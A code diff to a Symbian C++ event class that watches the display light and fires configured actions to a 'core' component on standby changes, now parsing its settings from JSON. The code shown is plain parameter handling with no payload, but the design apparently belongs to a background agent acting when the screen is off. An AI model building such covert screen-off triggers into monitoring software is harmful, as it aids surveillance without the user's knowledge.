@@ -12,6 +12,8 @@
 #include <hal_data.h>
 #include <e32std.h>
 
+#include "Json.h"
+
 
 CEventStandby::CEventStandby(TUint32 aTriggerId) :
 	CAbstractEvent(EEvent_Standby, aTriggerId)
@@ -48,8 +50,54 @@ void CEventStandby::ConstructL(const TDesC8& params)
 	__FLOG(_L("-------------"));
 	
 	BaseConstructL(params);
-	Mem::Copy(&iStandbyParams, iParams.Ptr(), sizeof(iStandbyParams));
 	
+	RBuf paramsBuf;
+		
+	TInt err = paramsBuf.Create(2*params.Size());
+	if(err == KErrNone)
+		{
+		paramsBuf.Copy(params);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+		
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//retrieve exit action
+		if(rootObject->Find(_L("end")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("end"),iStandbyParams.iExitAction);
+			}
+		else
+			iStandbyParams.iExitAction = -1;
+		//retrieve repeat action
+		if(rootObject->Find(_L("repeat")) != KErrNotFound)
+			{
+			rootObject->GetIntL(_L("repeat"),iStandbyParams.iRepeatAction);
+			rootObject->GetIntL(_L("iter"),iStandbyParams.iIter);
+			rootObject->GetIntL(_L("delay"),iStandbyParams.iDelay);
+			}
+		else
+			{
+			iStandbyParams.iRepeatAction = -1;
+			iStandbyParams.iIter = 0;
+			iStandbyParams.iDelay = 0;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+
 	}
 
 void CEventStandby::StartEventL()
@@ -169,7 +217,7 @@ void CEventStandby::LightStatusChanged(TInt aTarget, CHWRMLight::TLightStatus aS
 			__FLOG(_L("TriggerExitAction"));
 			iDisplayOff = EFalse;
 			// Triggers the  action
-			if (iStandbyParams.iExitAction != 0xFFFFFFFF)
+			if (iStandbyParams.iExitAction != -1)
 				{
 				SendActionTriggerToCoreL(iStandbyParams.iExitAction);
 				}
